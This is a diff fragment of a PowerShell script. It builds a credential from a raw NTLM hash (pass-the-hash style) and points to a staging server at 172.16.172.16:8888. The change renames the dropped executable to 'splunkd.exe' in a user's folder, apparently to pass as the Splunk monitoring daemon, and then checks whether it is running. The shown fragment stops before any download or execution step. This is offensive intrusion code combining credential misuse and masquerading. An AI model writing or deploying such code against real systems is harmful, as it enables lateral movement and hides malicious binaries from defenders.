@@ -6,8 +6,8 @@ $SecureNTLMHash = ConvertTo-SecureString -String $NTLMHash -AsPlainText -Force
 $Credential = New-Object System.Management.Automation.PSCredential("$DomainName\$UserName", $SecureNTLMHash)
 
 $server = "http://172.16.172.16:8888"
-$fileName = "new_file.exe"
-$file = "C:\Users\Public\$fileName"
+$fileName = "splunkd.exe"
+$file = "C:\Users\Sundar\$fileName"
 
 if (Test-Path $file) {
     $runningProcess = Get-Process | Where-Object { $_.Modules.FileName -eq $file }
